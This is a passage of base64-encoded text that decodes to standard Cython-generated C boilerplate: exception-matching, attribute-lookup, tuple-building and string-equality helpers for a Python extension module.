Z1bmN0aW9uX2Rlc2NyaXB0aW9uIGRlc2NyID0gezAsIDAsIDAsIDIsICh1bnNpZ25lZCBpbnQpKENPX09QVElNSVpFRHxDT19ORVdMT0NBTFMpLCA0NTAsIDU2fTsKICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X2ksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3R9OwogICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTRdID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX25lX3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9wcmludGluZywgX19weXhfa19VXzFfSVdBV0FfcV93YXFfUV9hLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzE0XSkpIGdvdG8gYmFkOwogIH0KICBQeV9ERUNSRUYodHVwbGVfZGVkdXBfbWFwKTsKICByZXR1cm4gMDsKICBiYWQ6CiAgUHlfREVDUkVGKHR1cGxlX2RlZHVwX21hcCk7CiAgcmV0dXJuIC0xOwp9CgoKc3RhdGljIGludCBfX1B5eF9Jbml0R2xvYmFscyh2b2lkKSB7CiAgCiAgaWYgKGxpa2VseShfX1B5eF9pbml0X2NvX3ZhcmlhYmxlcygpID09IDApKTsgZWxzZQoKaWYgKHVubGlrZWx5KFB5RXJyX09jY3VycmVkKCkpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCgogIAogICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCnsKICAgIFB5T2JqZWN0ICp0eXBlc01vZHVsZT1OVUxMOwogICAgdHlwZXNNb2R1bGUgPSBQeUltcG9ydF9JbXBvcnRNb2R1bGUoInR5cGVzIik7CiAgICBpZiAodHlwZXNNb2R1bGUpIHsKICAgICAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX1B5eF9DYWNoZWRNZXRob2RUeXBlID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyh0eXBlc01vZHVsZSwgIk1ldGhvZFR5cGUiKTsKICAgICAgICBQeV9ERUNSRUYodHlwZXNNb2R1bGUpOwogICAgfQp9IC8vIGVycm9yIGhhbmRsaW5nIGZvbGxvd3MKI2VuZGlmCgppZiAodW5saWtlbHkoUHlFcnJfT2NjdXJyZWQoKSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKCiAgcmV0dXJuIDA7CiAgX19weXhfTDFfZXJyb3I6OwogIHJldHVybiAtMTsKfQoKCgoKI2lmZGVmIF9NU0NfVkVSCiNwcmFnbWEgd2FybmluZyggcHVzaCApCgojcHJhZ21hIHdhcm5pbmcoIGRpc2FibGUgOiA0MTI3ICkKI2VuZGlmCgoKCgoKCgojaWYgQ1lUSE9OX1JFRk5BTk5ZCnN0YXRpYyBfX1B5eF9SZWZOYW5ueUFQSVN0cnVjdCAqX19QeXhfUmVmTmFubnlJbXBvcnRBUEkoY29uc3QgY2hhciAqbW9kbmFtZSkgewogICAgUHlPYmplY3QgKm0gPSBOVUxMLCAqcCA9IE5VTEw7CiAgICB2b2lkICpyID0gTlVMTDsKICAgIG0gPSBQeUltcG9ydF9JbXBvcnRNb2R1bGUobW9kbmFtZSk7CiAgICBpZiAoIW0pIGdvdG8gZW5kOwogICAgcCA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcobSwgIlJlZk5hbm55QVBJIik7CiAgICBpZiAoIXApIGdvdG8gZW5kOwogICAgciA9IFB5TG9uZ19Bc1ZvaWRQdHIocCk7CmVuZDoKICAgIFB5X1hERUNSRUYocCk7CiAgICBQeV9YREVDUkVGKG0pOwogICAgcmV0dXJuIChfX1B5eF9SZWZOYW5ueUFQSVN0cnVjdCAqKXI7Cn0KI2VuZGlmCgoKI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQpzdGF0aWMgaW50IF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXNUdXBsZShQeU9iamVjdCAqZXhjX3R5cGUsIFB5T2JqZWN0ICp0dXBsZSkgewogICAgUHlfc3NpemVfdCBpLCBuOwogICAgbiA9IFB5VHVwbGVfR0VUX1NJWkUodHVwbGUpOwogICAgZm9yIChpPTA7IGk8bjsgaSsrKSB7CiAgICAgICAgaWYgKGV4Y190eXBlID09IFB5VHVwbGVfR0VUX0lURU0odHVwbGUsIGkpKSByZXR1cm4gMTsKICAgIH0KICAgIGZvciAoaT0wOyBpPG47IGkrKykgewogICAgICAgIGlmIChfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoZXhjX3R5cGUsIFB5VHVwbGVfR0VUX0lURU0odHVwbGUsIGkpKSkgcmV0dXJuIDE7CiAgICB9CiAgICByZXR1cm4gMDsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlc0luU3RhdGUoUHlUaHJlYWRTdGF0ZSogdHN0YXRlLCBQeU9iamVjdCogZXJyKSB7CiAgICBpbnQgcmVzdWx0OwogICAgUHlPYmplY3QgKmV4Y190eXBlOwojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDBBNgogICAgUHlPYmplY3QgKmN1cnJlbnRfZXhjZXB0aW9uID0gdHN0YXRlLT5jdXJyZW50X2V4Y2VwdGlvbjsKICAgIGlmICh1bmxpa2VseSghY3VycmVudF9leGNlcHRpb24pKSByZXR1cm4gMDsKICAgIGV4Y190eXBlID0gKFB5T2JqZWN0KikgUHlfVFlQRShjdXJyZW50X2V4Y2VwdGlvbik7CiAgICBpZiAoZXhjX3R5cGUgPT0gZXJyKSByZXR1cm4gMTsKI2Vsc2UKICAgIGV4Y190eXBlID0gdHN0YXRlLT5jdXJleGNfdHlwZTsKICAgIGlmIChleGNfdHlwZSA9PSBlcnIpIHJldHVybiAxOwogICAgaWYgKHVubGlrZWx5KCFleGNfdHlwZSkpIHJldHVybiAwOwojZW5kaWYKICAgICNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgUHlfSU5DUkVGKGV4Y190eXBlKTsKICAgICNlbmRpZgogICAgaWYgKHVubGlrZWx5KFB5VHVwbGVfQ2hlY2soZXJyKSkpIHsKICAgICAgICByZXN1bHQgPSBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzVHVwbGUoZXhjX3R5cGUsIGVycik7CiAgICB9IGVsc2UgewogICAgICAgIHJlc3VsdCA9IF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhleGNfdHlwZSwgZXJyKTsKICAgIH0KICAgICNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgUHlfREVDUkVGKGV4Y190eXBlKTsKICAgICNlbmRpZgogICAgcmV0dXJuIHJlc3VsdDsKfQojZW5kaWYKCgojaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFCnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfRXJyUmVzdG9yZUluU3RhdGUoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqdHlwZSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqdGIpIHsKI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwQTYKICAgIFB5T2JqZWN0ICp0bXBfdmFsdWU7CiAgICBhc3NlcnQodHlwZSA9PSBOVUxMIHx8ICh2YWx1ZSAhPSBOVUxMICYmIHR5cGUgPT0gKFB5T2JqZWN0KikgUHlfVFlQRSh2YWx1ZSkpKTsKICAgIGlmICh2YWx1ZSkgewogICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04KICAgICAgICBpZiAodW5saWtlbHkoKChQeUJhc2VFeGNlcHRpb25PYmplY3QqKSB2YWx1ZSktPnRyYWNlYmFjayAhPSB0YikpCiAgICAgICAgI2VuZGlmCiAgICAgICAgICAgIFB5RXhjZXB0aW9uX1NldFRyYWNlYmFjayh2YWx1ZSwgdGIpOwogICAgfQogICAgdG1wX3ZhbHVlID0gdHN0YXRlLT5jdXJyZW50X2V4Y2VwdGlvbjsKICAgIHRzdGF0ZS0+Y3VycmVudF9leGNlcHRpb24gPSB2YWx1ZTsKICAgIFB5X1hERUNSRUYodG1wX3ZhbHVlKTsKICAgIFB5X1hERUNSRUYodHlwZSk7CiAgICBQeV9YREVDUkVGKHRiKTsKI2Vsc2UKICAgIFB5T2JqZWN0ICp0bXBfdHlwZSwgKnRtcF92YWx1ZSwgKnRtcF90YjsKICAgIHRtcF90eXBlID0gdHN0YXRlLT5jdXJleGNfdHlwZTsKICAgIHRtcF92YWx1ZSA9IHRzdGF0ZS0+Y3VyZXhjX3ZhbHVlOwogICAgdG1wX3RiID0gdHN0YXRlLT5jdXJleGNfdHJhY2ViYWNrOwogICAgdHN0YXRlLT5jdXJleGNfdHlwZSA9IHR5cGU7CiAgICB0c3RhdGUtPmN1cmV4Y192YWx1ZSA9IHZhbHVlOwogICAgdHN0YXRlLT5jdXJleGNfdHJhY2ViYWNrID0gdGI7CiAgICBQeV9YREVDUkVGKHRtcF90eXBlKTsKICAgIFB5X1hERUNSRUYodG1wX3ZhbHVlKTsKICAgIFB5X1hERUNSRUYodG1wX3RiKTsKI2VuZGlmCn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9FcnJGZXRjaEluU3RhdGUoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpIHsKI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwQTYKICAgIFB5T2JqZWN0KiBleGNfdmFsdWU7CiAgICBleGNfdmFsdWUgPSB0c3RhdGUtPmN1cnJlbnRfZXhjZXB0aW9uOwogICAgdHN0YXRlLT5jdXJyZW50X2V4Y2VwdGlvbiA9IDA7CiAgICAqdmFsdWUgPSBleGNfdmFsdWU7CiAgICAqdHlwZSA9IE5VTEw7CiAgICAqdGIgPSBOVUxMOwogICAgaWYgKGV4Y192YWx1ZSkgewogICAgICAgICp0eXBlID0gKFB5T2JqZWN0KikgUHlfVFlQRShleGNfdmFsdWUpOwogICAgICAgIFB5X0lOQ1JFRigqdHlwZSk7CiAgICAgICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgogICAgICAgICp0YiA9ICgoUHlCYXNlRXhjZXB0aW9uT2JqZWN0KikgZXhjX3ZhbHVlKS0+dHJhY2ViYWNrOwogICAgICAgIFB5X1hJTkNSRUYoKnRiKTsKICAgICAgICAjZWxzZQogICAgICAgICp0YiA9IFB5RXhjZXB0aW9uX0dldFRyYWNlYmFjayhleGNfdmFsdWUpOwogICAgICAgICNlbmRpZgogICAgfQojZWxzZQogICAgKnR5cGUgPSB0c3RhdGUtPmN1cmV4Y190eXBlOwogICAgKnZhbHVlID0gdHN0YXRlLT5jdXJleGNfdmFsdWU7CiAgICAqdGIgPSB0c3RhdGUtPmN1cmV4Y190cmFjZWJhY2s7CiAgICB0c3RhdGUtPmN1cmV4Y190eXBlID0gMDsKICAgIHRzdGF0ZS0+Y3VyZXhjX3ZhbHVlID0gMDsKICAgIHRzdGF0ZS0+Y3VyZXhjX3RyYWNlYmFjayA9IDA7CiNlbmRpZgp9CiNlbmRpZgoKCiNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFMKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoUHlPYmplY3QqIG9iaiwgUHlPYmplY3QqIGF0dHJfbmFtZSkgewogICAgUHlUeXBlT2JqZWN0KiB0cCA9IFB5X1RZUEUob2JqKTsKICAgIGlmIChsaWtlbHkodHAtPnRwX2dldGF0dHJvKSkKICAgICAgICByZXR1cm4gdHAtPnRwX2dldGF0dHJvKG9iaiwgYXR0cl9uYW1lKTsKICAgIHJldHVybiBQeU9iamVjdF9HZXRBdHRyKG9iaiwgYXR0cl9uYW1lKTsKfQojZW5kaWYKCgojaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwZDAwMDAKc3RhdGljIHZvaWQgX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cl9DbGVhckF0dHJpYnV0ZUVycm9yKHZvaWQpIHsKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgIGlmIChsaWtlbHkoX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcyhQeUV4Y19BdHRyaWJ1dGVFcnJvcikpKQogICAgICAgIF9fUHl4X1B5RXJyX0NsZWFyKCk7Cn0KI2VuZGlmCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcihQeU9iamVjdCogb2JqLCBQeU9iamVjdCogYXR0cl9uYW1lKSB7CiAgICBQeU9iamVjdCAqcmVzdWx0OwojaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwCiAgICAodm9pZCkgUHlPYmplY3RfR2V0T3B0aW9uYWxBdHRyKG9iaiwgYXR0cl9uYW1lLCAmcmVzdWx0KTsKICAgIHJldHVybiByZXN1bHQ7CiNlbHNlCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCiAgICBQeVR5cGVPYmplY3QqIHRwID0gUHlfVFlQRShvYmopOwogICAgaWYgKGxpa2VseSh0cC0+dHBfZ2V0YXR0cm8gPT0gUHlPYmplY3RfR2VuZXJpY0dldEF0dHIpKSB7CiAgICAgICAgcmV0dXJuIF9QeU9iamVjdF9HZW5lcmljR2V0QXR0cldpdGhEaWN0KG9iaiwgYXR0cl9uYW1lLCBOVUxMLCAxKTsKICAgIH0KI2VuZGlmCiAgICByZXN1bHQgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKG9iaiwgYXR0cl9uYW1lKTsKICAgIGlmICh1bmxpa2VseSghcmVzdWx0KSkgewogICAgICAgIF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHJfQ2xlYXJBdHRyaWJ1dGVFcnJvcigpOwogICAgfQogICAgcmV0dXJuIHJlc3VsdDsKI2VuZGlmCn0KCgpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dldEJ1aWx0aW5OYW1lKFB5T2JqZWN0ICpuYW1lKSB7CiAgICBQeU9iamVjdCogcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0ck5vRXJyb3IoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfYiwgbmFtZSk7CiAgICBpZiAodW5saWtlbHkoIXJlc3VsdCkgJiYgIVB5RXJyX09jY3VycmVkKCkpIHsKICAgICAgICBQeUVycl9Gb3JtYXQoUHlFeGNfTmFtZUVycm9yLAogICAgICAgICAgICAibmFtZSAnJVUnIGlzIG5vdCBkZWZpbmVkIiwgbmFtZSk7CiAgICB9CiAgICByZXR1cm4gcmVzdWx0Owp9CgoKI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgQ1lUSE9OX01FVEhfRkFTVENBTEwKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKgpfX1B5eF9QeVR1cGxlX0Zyb21BcnJheShQeU9iamVjdCAqY29uc3QgKnNyYywgUHlfc3NpemVfdCBuKQp7CiAgICBQeU9iamVjdCAqcmVzOwogICAgUHlfc3NpemVfdCBpOwogICAgaWYgKG4gPD0gMCkgewogICAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUpOwogICAgfQogICAgcmVzID0gUHlUdXBsZV9OZXcobik7CiAgICBpZiAodW5saWtlbHkocmVzID09IE5VTEwpKSByZXR1cm4gTlVMTDsKICAgIGZvciAoaSA9IDA7IGkgPCBuOyBpKyspIHsKICAgICAgICBpZiAodW5saWtlbHkoX19QeXhfUHlUdXBsZV9TRVRfSVRFTShyZXMsIGksIHNyY1tpXSkgPCAoMCkpKSB7CiAgICAgICAgICAgIFB5X0RFQ1JFRihyZXMpOwogICAgICAgICAgICByZXR1cm4gTlVMTDsKICAgICAgICB9CiAgICAgICAgUHlfSU5DUkVGKHNyY1tpXSk7CiAgICB9CiAgICByZXR1cm4gcmVzOwp9CiNlbGlmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X2NvcHlfb2JqZWN0X2FycmF5KFB5T2JqZWN0ICpjb25zdCAqQ1lUSE9OX1JFU1RSSUNUIHNyYywgUHlPYmplY3QqKiBDWVRIT05fUkVTVFJJQ1QgZGVzdCwgUHlfc3NpemVfdCBsZW5ndGgpIHsKICAgIFB5T2JqZWN0ICp2OwogICAgUHlfc3NpemVfdCBpOwogICAgZm9yIChpID0gMDsgaSA8IGxlbmd0aDsgaSsrKSB7CiAgICAgICAgdiA9IGRlc3RbaV0gPSBzcmNbaV07CiAgICAgICAgUHlfSU5DUkVGKHYpOwogICAgfQp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICoKX19QeXhfUHlUdXBsZV9Gcm9tQXJyYXkoUHlPYmplY3QgKmNvbnN0ICpzcmMsIFB5X3NzaXplX3QgbikKewogICAgUHlPYmplY3QgKnJlczsKICAgIGlmIChuIDw9IDApIHsKICAgICAgICByZXR1cm4gX19QeXhfTmV3UmVmKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlKTsKICAgIH0KICAgIHJlcyA9IFB5VHVwbGVfTmV3KG4pOwogICAgaWYgKHVubGlrZWx5KHJlcyA9PSBOVUxMKSkgcmV0dXJuIE5VTEw7CiAgICBfX1B5eF9jb3B5X29iamVjdF9hcnJheShzcmMsICgoUHlUdXBsZU9iamVjdCopcmVzKS0+b2JfaXRlbSwgbik7CiAgICByZXR1cm4gcmVzOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICoKX19QeXhfUHlMaXN0X0Zyb21BcnJheShQeU9iamVjdCAqY29uc3QgKnNyYywgUHlfc3NpemVfdCBuKQp7CiAgICBQeU9iamVjdCAqcmVzOwogICAgaWYgKG4gPD0gMCkgewogICAgICAgIHJldHVybiBQeUxpc3RfTmV3KDApOwogICAgfQogICAgcmVzID0gUHlMaXN0X05ldyhuKTsKICAgIGlmICh1bmxpa2VseShyZXMgPT0gTlVMTCkpIHJldHVybiBOVUxMOwogICAgX19QeXhfY29weV9vYmplY3RfYXJyYXkoc3JjLCAoKFB5TGlzdE9iamVjdCopcmVzKS0+b2JfaXRlbSwgbik7CiAgICByZXR1cm4gcmVzOwp9CiNlbmRpZgoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUJ5dGVzX0VxdWFscyhQeU9iamVjdCogczEsIFB5T2JqZWN0KiBzMiwgaW50IGVxdWFscykgewojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTCB8fFwKICAgICAgICAhKENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFICYmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MpCiAgICByZXR1cm4gUHlPYmplY3RfUmljaENvbXBhcmVCb29sKHMxLCBzMiwgZXF1YWxzKTsKI2Vsc2UKICAgIGlmIChzMSA9PSBzMikgewogICAgICAgIHJldHVybiAoZXF1YWxzID09IFB5X0VRKTsKICAgIH0gZWxzZSBpZiAoUHlCeXRlc19DaGVja0V4YWN0KHMxKSAmIFB5Qnl0ZXNfQ2hlY2tFeGFjdChzMikpIHsKICAgICAgICBjb25zdCBjaGFyICpwczEsICpwczI7CiAgICAgICAgUHlfc3NpemVfdCBsZW5ndGggPSBQeUJ5dGVzX0dFVF9TSVpFKHMxKTsKICAgICAgICBpZiAobGVuZ3RoICE9IFB5Qnl0ZXNfR0VUX1NJWkUoczIpKQogICAgICAgICAgICByZXR1cm4gKGVxdWFscyA9PSBQeV9ORSk7CiAgICAgICAgcHMxID0gUHlCeXRlc19BU19TVFJJTkcoczEpOwogICAgICAgIHBzMiA9IFB5Qnl0ZXNfQVNfU1RSSU5HKHMyKTsKICAgICAgICBpZiAocHMxWzBdICE9IHBzMlswXSkgewogICAgICAgICAgICByZXR1cm4gKGVxdWFscyA9PSBQeV9ORSk7CiAgICAgICAgfSBlbHNlIGlmIChsZW5ndGggPT0gMSkgewogICAgICAgICAgICByZXR1cm4gKGVxdWFscyA9PSBQeV9FUSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgaW50IHJlc3VsdDsKI2lmIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFMgJiYgKFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBCMDAwMCkKICAgICAgICAgICAgUHlfaGFzaF90IGhhc2gxLCBoYXNoMjsKICAgICAgICAgICAgaGFzaDEgPSAoKFB5Qnl0ZXNPYmplY3QqKXMxKS0+b2Jfc2hhc2g7CiAgICAgICAgICAgIGhhc2gyID0gKChQeUJ5dGVzT2JqZWN0KilzMiktPm9iX3NoYXNoOwogICAgICAgICAgICBpZiAoaGFzaDEgIT0gaGFzaDIgJiYgaGFzaDEgIT0gLTEgJiYgaGFzaDIgIT0gLTEpIHsKICAgICAgICAgICAgICAgIHJldHVybiAoZXF1YWxzID09IFB5X05FKTsKICAgICAgICAgICAgfQojZW5kaWYKICAgICAgICAgICAgcmVzdWx0ID0gbWVtY21wKHBzMSwgcHMyLCAoc2l6ZV90KWxlbmd0aCk7CiAgICAgICAgICAgIHJldHVybiAoZXF1YWxzID09IFB5X0VRKSA/IChyZXN1bHQgPT0gMCkgOiAocmVzdWx0ICE9IDApOwogICAgICAgIH0KICAgIH0gZWxzZSBpZiAoKHMxID09IFB5X05vbmUpICYgUHlCeXRlc19DaGVja0V4YWN0KHMyKSkgewogICAgICAgIHJldHVybiAoZXF1YWxzID09IFB5X05FKTsKICAgIH0gZWxzZSBpZiAoKHMyID09IFB5X05vbmUpICYgUHlCeXRlc19DaGVja0V4YWN0KHMxKSkgewogICAgICAgIHJldHVybiAoZXF1YWxzID09IFB5X05FKTsKICAgIH0gZWxzZSB7CiAgICAgICAgaW50IHJlc3VsdDsKICAgICAgICBQeU9iamVjdCogcHlfcmVzdWx0ID0gUHlPYmplY3RfUmljaENvbXBhcmUoczEsIHMyLCBlcXVhbHMpOwogICAgICAgIGlmICghcHlfcmVzdWx0KQogICAgICAgICAgICByZXR1cm4gLTE7CiAgICAgICAgcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKHB5X3Jlc3VsdCk7CiAgICAgICAgUHlfREVDUkVGKHB5X3Jlc3VsdCk7CiAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgIH0KI2VuZGlmCn0KCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlVbmljb2RlX0VxdWFscyhQeU9iamVjdCogczEsIFB5T2JqZWN0KiBzMiwgaW50IGVxdWFscykgewojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTAogICAgcmV0dXJuIFB5T2JqZWN0X1JpY2hDb21wYXJlQm9vbChzMSwgczIsIGVxdWFscyk7CiNlbHNlCiAgICBpbnQgczFfaXNfdW5pY29kZSwgczJfaXNfdW5pY29kZTsKICAgIGlmIChzMSA9PSBzMikgewogICAgICAgIGdvdG8gcmV0dXJuX2VxOwogICAgfQogICAgczFfaXNfdW5pY29kZSA9IFB5VW5pY29kZV9DaGVja0V4YWN0KHMxKTsKICAgIHMyX2lzX3VuaWNvZGUgPSBQeVVuaWNvZGVfQ2hlY2tFeGFjdChzMik7CiAgICBpZiAoczFfaXNfdW5pY29kZSAmIHMyX2lzX3VuaWNvZGUpIHsKICAgICAgICBQeV9zc2l6ZV90IGxlbmd0aCwgbGVuZ3RoMjsKICAgICAgICBpbnQga2luZDsKICAgICAgICB2b2lkICpkYXRhMSwgKmRhdGEyOwogICAgICAgICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgICAgIGlmICh1bmxpa2VseShfX1B5eF9QeVVuaWNvZGVfUkVBRFkoczEpIDwgMCkgfHwgdW5saWtlbHkoX19QeXhfUHlVbmljb2RlX1JFQURZKHMyKSA8IDApKQogICAgICAgICAgICByZXR1cm4gLTE7CiAgICAgICAgI2VuZGlmCiAgICAgICAgbGVuZ3RoID0gX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoczEpOwogICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgICAgICBpZiAodW5saWtlbHkobGVuZ3RoIDwgMCkpIHJldHVybiAtMTsKICAgICAgICAjZW5kaWYKICAgICAgICBsZW5ndGgyID0gX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoczIpOwogICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgICAgICBpZiAodW5saWtlbHkobGVuZ3RoMiA8IDApKSByZXR1cm4gLTE7CiAgICAgICAgI2VuZGlmCiAgICAgICAgaWYgKGxlbmd0aCAhPSBsZW5ndGgyKSB7CiAgICAgICAgICAgIGdvdG8gcmV0dXJuX25lOwogICAgICAgIH0KI2lmIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFMKICAgICAgICB7CiAgICAgICAgICAgIFB5X2hhc2hfdCBoYXNoMSwgaGFzaDI7CiAgICAgICAgICAgIGhhc2gxID0gKChQeUFTQ0lJT2JqZWN0KilzMSktPmhhc2g7CiAgICAgICAgICAgIGhhc2gyID0gKChQeUFTQ0lJT2JqZWN0KilzMiktPmhhc2g7CiAgICAgICAgICAgIGlmIChoYXNoMSAhPSBoYXNoMiAmJiBoYXNoMSAhPSAtMSAmJiBoYXNoMiAhPSAtMSkgewogICAgICAgICAgICAgICAgZ290byByZXR1cm5fbmU7CiAgICAgICAgICAgIH0KICAgICAgICB9CiNlbmRpZgogICAgICAgIGtpbmQgPSBfX1B5eF9QeVVuaWNvZGVfS0lORChzMSk7CiAgICAgICAgaWYgKGtpbmQgIT0gX19QeXhfUHlVbmljb2RlX0tJTkQoczIpKSB7CiAgICAgICAgICAgIGdvdG8gcmV0dXJuX25lOwogICAgICAgIH0KICAgICAgICBkYXRhMSA9IF9fUHl4X1B5VW5pY29kZV9EQVRBKHMxKTsKICAgICAgICBkYXRhMiA9IF9fUHl4X1B5VW5pY29kZV9EQVRBKHMyKTsKICAgICAgICBpZiAoX19QeXhfUHlVbmljb2RlX1JFQUQoa2luZCwgZGF0YTEsIDApICE9IF9fUHl4X1B5VW5pY29kZV9SRUFEKGtpbmQsIGRhdGEyLCAwKSkgewogICAgICAgICAgICBnb3RvIHJldHVybl9uZTsKICAgICAgICB9IGVsc2UgaWYgKGxlbmd0aCA9PSAxKSB7CiAgICAgICAgICAgIGdvdG8gcmV0dXJuX2VxOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGludCByZXN1bHQgPSBtZW1jbXAoZGF0YTEsIGRhdGEyLCAoc2l6ZV90KShsZW5ndGggKiBraW5kKSk7CiAgICAgICAgICAgIHJldHVybiAoZXF1YWxzID09IFB5X0VRKSA/IChyZXN1bHQgPT0gMCkgOiAocmVzdWx0ICE9IDApOwogICAgICAgIH0KICAgIH0gZWxzZSBpZiAoKHMxID09IFB5X05vbmUpICYgczJfaXNfdW5pY29kZSkgewogICAgICAgIGdvdG8gcmV0dXJuX25lOwogICAgfSBlbHNlIGlmICgoczIgPT0gUHlfTm9uZSkgJiBzMV9pc191bmljb2RlKSB7CiAgICAgICAgZ290byByZXR1cm5fbmU7CiAgICB9IGVsc2UgewogICAgICAgIGludCByZXN1bHQ7CiAgICAgICAgUHlPYmplY3QqIHB5X3Jlc3VsdCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKHMxLCBzMiwgZXF1YWxzKTsKICAgICAgICBpZiAoIXB5X3Jlc3VsdCkKICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgIHJlc3VsdCA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShweV9yZXN1bHQpOwogICAgICAgIFB5X0RFQ1JFRihweV9yZXN1bHQpOwogICAgICAgIHJldHVybiByZXN1bHQ7CiAgICB9CnJldHVybl9lcToKICAgIHJldHVybiAoZXF1YWxzID09IFB5X0VRKTsKcmV0dXJuX25lOgogICAgcmV0dXJuIChlcXVhbHMgPT0gUHlfTkUpOwojZW5kaWYKfQoKCiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTApzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqIF9fU